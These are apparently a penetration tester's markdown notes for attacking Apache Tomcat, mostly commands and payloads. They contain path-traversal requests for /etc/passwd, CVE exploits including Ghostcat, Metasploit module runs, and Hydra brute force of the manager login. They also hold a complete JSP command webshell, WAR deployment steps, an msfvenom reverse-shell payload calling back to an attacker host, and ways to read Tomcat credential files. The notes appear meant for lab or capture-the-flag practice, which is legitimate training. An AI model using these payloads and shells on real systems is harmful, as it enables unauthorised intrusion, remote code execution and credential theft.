---
id: Exploitation
aliases: []
tags:
  - Networking/Services/Tomcat/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___


<!-- Path Traversal {{{-->
## Path Traversal

Access sensitive files using path traversal techniques

```sh
http://$target:8080/../../../etc/passwd
```

```sh
http://$target:8080/..;/..;/..;/etc/passwd
```

Double encoding

```sh
http://$target:8080/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

URL encoding

```sh
http://$target:8080/..%2f..%2f..%2fetc%2fpasswd
```

Windows

```sh
http://$target:8080/..\..\..\..\windows\win.ini
```

___
<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- CVE-2017-12617 {{{-->
### CVE-2017-12617

[CVE-2017-12617](https://nvd.nist.gov/vuln/detail/cve-2017-12617)

<!-- Info {{{-->
> [!info]-
>
> Apache Tomcat
>
> - `7.0.0` - `7.0.81`
> - `9.0.0.M1` - `9.0.0`
> - `8.5.0` - `8.5.22`
> - `8.0.0.RC1` - `8.0.46`
>
<!-- }}} -->

[[cURL]] — `PUT` method RCE

```sh
curl -X PUT http://$target:8080/shell.jsp/ -d '<%@ page import="java.io.*"%>
<jsp_shell>'
```

[[Metasploit]] — [Tomcat RCE via JSP Upload Bypass](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_jsp_upload_bypass/)

```sh
use exploit/multi/http/tomcat_jsp_upload_bypass
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/multi/http/tomcat_jsp_upload_bypass
> ```
> ```sh
> set RHOSTS target.com
> ```
> ```sh
> set LHOST tun0
> ```
> ```sh
> set LPORT 1234
> ```
> ```sh
> run
> ```
<!-- }}} -->

<!-- }}} -->

<!-- CVE-2019-0232 {{{-->
### CVE-2019-0232

[CVE-2019-0232](https://nvd.nist.gov/vuln/detail/cve-2019-0232)

<!-- Info {{{-->
> [!info]-
>
> Apache Tomcat
>
> - `9.0.0.M1` to `9.0.17`
> - `8.5.0` to `8.5.39`
> - `7.0.0` to `7.0.93`
>
<!-- }}} -->

RCE via CGI servlet
(*Windows, CGI Servlet enabled*)

```sh
http://$target:8080/cgi-bin/test.bat?&dir
```

[[Metasploit]] — [Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability](https://www.rapid7.com/db/modules/exploit/windows/http/tomcat_cgi_cmdlineargs/)

```sh
use exploit/windows/http/tomcat_cgi_cmdlineargs
```

<!-- Info {{{-->
> [!info]-
>
> This module exploits a vulnerability in Apache Tomcat's CGIServlet component.
> When the `enableCmdLineArguments` setting is set to true,
> a remote user can abuse this to execute system commands,
> and gain remote code execution
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/http/tomcat_cgi_cmdlineargs
> ```
> ```sh
> set RHOSTS target.com
> ```
> ```sh
> set LHOST tun0
> ```
> ```sh
> set LPORT 1234
> ```
> ```sh
> run
> ```
<!-- }}} -->

<!-- }}} -->

<!-- CVE-2020-1938 {{{-->
### CVE-2020-1938

[CVE-2020-1938](https://nvd.nist.gov/vuln/detail/cve-2020-1938) (*Ghostcat*) —
Exploit AJP connector (*port `8009`*) vulnerabilities
for file read/write access

<!-- Info {{{-->
> [!info]-
>
> Affects Tomcat version
>
> - `6`
> - `7` < `7.0.100`
> - `8` < `8.5.51`
> - `9` < `9.0.31`
<!-- }}} -->

[[Nmap]] — Enumerate AJP connector

```sh
nmap $target -p 8009 --script ajp-methods,ajp-request
```

[[Metasploit]] — [Apache Tomcat AJP File Read](https://www.rapid7.com/db/modules/auxiliary/admin/http/tomcat_ghostcat/)

```sh
use auxiliary/admin/http/tomcat_ghostcat
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use auxiliary/admin/http/tomcat_ghostcat
> ```
> ```sh
> set RHOSTS target.com
> ```
> ```sh
> set RPORT 8009
> ```
> ```sh
> set FILENAME /WEB-INF/web.xml
> ```
> ```sh
> run
> ```
<!-- }}} -->

[ajpShooter.py](https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py) —
Read arbitrary files

```sh
python2 ajpShooter.py http://$target:8009/ 8009 /WEB-INF/web.xml read
```

[ajpShooter.py](https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py) —
Upload webshell

```sh
python2 ajpShooter.py http://$target:8009/ 8009 /shell.jsp upload
```


<!-- }}} -->

___
<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

Brute Force Default Credentials

<!-- Tip {{{-->
> [!tip]- Default Credentials
>
> ```sh
> /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
> ```
> ```sh
> /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt
> ```
>
> Metasploit
>
> ```sh
> /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt
> ```
> ```sh
> set PASS_FILE /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt
> ```
<!-- }}} -->

[[Metasploit]] — [Tomcat Application Manager Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)

```sh
use auxiliary/scanner/http/tomcat_mgr_login
```

<!-- Info {{{-->
> [!info]-
>
> This module simply attempts to login to a Tomcat Application Manager instance
> using a specific user/pass
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfconsole -q
> ```
> ```sh
> use auxiliary/scanner/http/tomcat_mgr_login
> ```
> ```sh
> set rhosts 10.129.136.9
> ```
> ```sh
> run
> ```
<!-- }}} -->

[[Hydra]]

```sh
hydra -L <users.txt> -P <passwords.txt> $target -s 8080 http-get /manager/html
```

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Web Application Manager {{{-->
## Web Application Manager

<!-- Warning {{{-->
> [!warning]
>
> `admin`, `manager` or `manager-script` role required
<!-- }}} -->

<!-- Enumeration {{{-->
### Enumeration

Enumerate Manager Application Access

Deployed applications

```sh
curl -u '<admin>:<password>' http://$target:8080/manager/text/list
```

Application status

```sh
curl -u '<admin>:<password>' http://$target:8080/manager/text/serverinfo
```

Session information

```sh
curl -u '<admin>:<password>' http://$target:8080/manager/text/sessions?path=/app
```

<!-- }}} -->

<!-- Code Execution {{{-->
### Code Execution

Deploy malicious [WAR](https://en.wikipedia.org/wiki/WAR_(file_format))
file for code execution

<!-- Info {{{-->
> [!info]-
>
> ![[wam-deploy.png]]
>
<!-- }}} -->

<!-- Manual {{{-->
#### Manual

1. Create a [JSP](https://en.wikipedia.org/wiki/Jakarta_Server_Pages)
   web shell

<!-- Example {{{-->
> [!example]-
>
> ```sh
> cat > shell.jsp << 'EOF'
> <%@ page import="java.io.*" %>
> <%
> String cmd = request.getParameter("cmd");
> if(cmd != null) {
>     Process p = Runtime.getRuntime().exec(cmd);
>     OutputStream os = p.getOutputStream();
>     InputStream in = p.getInputStream();
>     DataInputStream dis = new DataInputStream(in);
>     String disr = dis.readLine();
>     while ( disr != null ) {
>         out.println(disr);
>         disr = dis.readLine();
>     }
> }
> %>
> EOF
> ```
<!-- }}} -->

2. Package as `WAR`

```sh
mkdir -p WEB-INF
```

```sh
jar -cvf shell.war shell.jsp WEB-INF
```

<!-- Info {{{-->
> [!info]-
>
> Install JDK
>
> ```sh
> sudo apt update && sudo apt install default-jdk
> ```
<!-- }}} -->

3. [[cURL]] - Deploy to the target

```sh
curl -u '<user>:<password>' \
  --upload-file shell.war \
  "http://$target:8080/manager/text/deploy?path=/shell&update=true"
```

<!-- Tip {{{-->
> [!tip]- PUT Method
>
> Test if `PUT` is allowed
>
> ```sh
> curl -X OPTIONS http://$target:8080/ -v
> ```
>
> Upload JSP shell via `PUT`
>
> ```sh
> curl -X PUT http://$target:8080/shell.jsp \
>   -d '<%@ page import="java.io.*" %><%out.println(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream());%>'
> ```
<!-- }}} -->

4. Access the web shell

```sh
curl "http://$target:8080/shell/shell.jsp?cmd=<command>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl "http://$target:8080/shell/shell.jsp?cmd=whoami"
> ```
>
> ```sh
> nt authority\system
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Msfvenom {{{-->
#### Msfvenom

[[Msfvenom]] — Create a payload and deploy it to the target

1. Create a web shell
(*[jsp_shell_reverse_tcp](https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb)*)

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=1234 -f war -o shell.war
```

2. [[cURL]] - Deploy web shell to the target

```sh
curl -u '<user>:<password>' \
    --upload-file shell.war
    "http://$target:8080/manager/text/deploy?path=/shell"
```

<!-- Tip {{{-->
> [!tip]- PUT Method
>
> Test if `PUT` is allowed
>
> ```sh
> curl -X OPTIONS http://$target:8080/ -v
> ```
>
> Upload JSP shell via `PUT`
>
> ```sh
> curl -X PUT http://$target:8080/shell.jsp \
>   -d '<%@ page import="java.io.*" %><%out.println(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream());%>'
> ```
<!-- }}} -->

3. Access the web shell

```sh
curl "http://$target:8080/shell/shell.jsp?cmd=<command>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl "http://$target:8080/shell/shell.jsp?cmd=whoami"
> ```
>
> ```sh
> nt authority\system
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Metasploit {{{-->
#### Metasploit

[[Metasploit]] — [Apache Tomcat Manager Authenticated Upload Code Execution](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)

```sh
use exploit/multi/http/tomcat_mgr_upload
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
> ```
> ```sh
> HttpPassword => s3cret
> ```
> ```sh
> msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
> ```
> ```sh
> HttpUsername => tomcat
> ```
> ```sh
> msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.10.95
> ```
> ```sh
> RHOSTS => 10.10.10.95
> ```
> ```sh
> msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080
> ```
> ```sh
> RPORT => 8080
> ```
> ```sh
> msf exploit(multi/http/tomcat_mgr_upload) > set LHOST tun0
> ```
> ```sh
> LHOST => 10.10.14.37
> ```
> ```sh
> msf exploit(multi/http/tomcat_mgr_upload) > set LPORT 1234
> ```
> ```sh
> LPORT => 1234
> ```
> ```sh
> exploit
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Credential Hunting {{{-->
## Credential Hunting

Read `tomcat-users.xml`

```sh
curl http://target.com:8080/WEB-INF/../conf/tomcat-users.xml
```

Read `web.xml` for database credentials

```sh
curl http://target.com:8080/WEB-INF/web.xml
```

Check configuration files

```sh
/conf/server.xml
/conf/tomcat-users.xml
/conf/context.xml
/WEB-INF/web.xml
```

[ajpShooter.py](https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py) —
AJP Ghostcat

```sh
python ajpShooter.py http://target.com:8009/ 8009 /WEB-INF/../conf/tomcat-users.xml read
```
___
<!-- }}} -->


<!-- }}} -->
